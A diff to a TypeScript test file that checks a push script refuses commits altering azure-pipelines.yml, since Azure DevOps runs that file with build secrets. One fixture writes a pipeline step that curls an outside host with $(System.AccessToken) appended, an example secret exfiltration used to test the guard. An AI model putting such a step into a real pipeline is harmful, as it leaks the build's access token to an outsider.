@@ -24,12 +24,17 @@ const g = (cwd: string, ...args: string[]) => {
   return r.stdout.trim();
 };
 
+// The pipeline file ADO runs; the base commit holds develop's version of it.
+const YML = 'azure-pipelines.yml';
+const YML_DEVELOP = 'trigger: none\nsteps:\n  - script: dotnet test\n';
+
 // repo makes a worktree with one commit on origin/develop and one after it, on branch feature/x.
 const repo = (name: string, msg = 'change'): string => {
   const wt = join(root, name);
   g(root, 'init', '-q', '-b', 'develop', wt);
   writeFileSync(join(wt, 'a.txt'), 'a\n');
-  g(wt, 'add', 'a.txt');
+  writeFileSync(join(wt, YML), YML_DEVELOP);
+  g(wt, 'add', 'a.txt', YML);
   g(wt, 'commit', '-q', '-m', 'base');
   g(wt, 'update-ref', 'refs/remotes/origin/develop', 'HEAD');
   g(wt, 'checkout', '-q', '-b', 'feature/x');
@@ -224,6 +229,60 @@ test("GIT_* env from the caller does not reach the checks' git", () => {
   expect(existsSync(ran) ? 'fsmonitor ran' : 'fsmonitor not run').toBe('fsmonitor not run');
   expect(r.err).toContain('no az token');
   expect(r.rc).toBe(2);
+});
+
+// ADO runs the pipeline file of the pushed commit, so a branch that edits it could run anything with the build's
+// secrets. run pushes only a commit whose azure-pipelines.yml is develop's or integration/96365-b1's, or the version
+// at the point where the branch left one of them (branches cut before develop changed the file keep the old one).
+const commitYml = (wt: string, body: string, msg = 'pipeline change') => {
+  writeFileSync(join(wt, YML), body);
+  g(wt, 'commit', '-q', '-am', msg);
+};
+
+test('a commit that edits azure-pipelines.yml is refused before any push', () => {
+  const wt = repo('yml-edit');
+  commitYml(wt, YML_DEVELOP + '  - script: curl https://example.com/$(System.AccessToken)\n');
+  const r = run(wt);
+  expect(r.err).toContain(`ado-suite: ${YML} in `);
+  expect(r.err).toContain("is not origin/develop's or integration/96365-b1's");
+  expect(r.rc).toBe(2);
+  expect(r.azCalled).toBe(false);
+});
+
+test('a commit with no azure-pipelines.yml is refused', () => {
+  const wt = repo('yml-gone');
+  g(wt, 'rm', '-q', YML);
+  g(wt, 'commit', '-q', '-m', 'drop pipeline');
+  const r = run(wt);
+  expect(r.err).toContain(`has no ${YML}`);
+  expect(r.rc).toBe(2);
+  expect(r.azCalled).toBe(false);
+});
+
+test("a yml equal to integration/96365-b1's passes", () => {
+  const wt = repo('yml-int');
+  const changed = YML_DEVELOP + '  - script: echo integration\n';
+  g(wt, 'checkout', '-q', '-b', 'int', 'refs/remotes/origin/develop');
+  commitYml(wt, changed, 'integration pipeline');
+  g(wt, 'update-ref', 'refs/remotes/origin/integration/96365-b1', 'HEAD');
+  g(wt, 'checkout', '-q', 'feature/x');
+  commitYml(wt, changed, 'same pipeline as integration');
+  const r = run(wt);
+  expect(r.err).toContain('no az token');
+  expect(r.rc).toBe(2);
+  expect(r.azCalled).toBe(true);
+});
+
+test('a branch cut before develop changed the yml passes with the version it left with', () => {
+  const wt = repo('yml-old');
+  g(wt, 'checkout', '-q', '--detach', 'refs/remotes/origin/develop');
+  commitYml(wt, YML_DEVELOP + '  - script: echo newer develop\n', 'develop moves on');
+  g(wt, 'update-ref', 'refs/remotes/origin/develop', 'HEAD');
+  g(wt, 'checkout', '-q', 'feature/x');
+  const r = run(wt);
+  expect(r.err).toContain('no az token');
+  expect(r.rc).toBe(2);
+  expect(r.azCalled).toBe(true);
 });
 
 test('usage and branch refusals keep their rc 2 and text', () => {
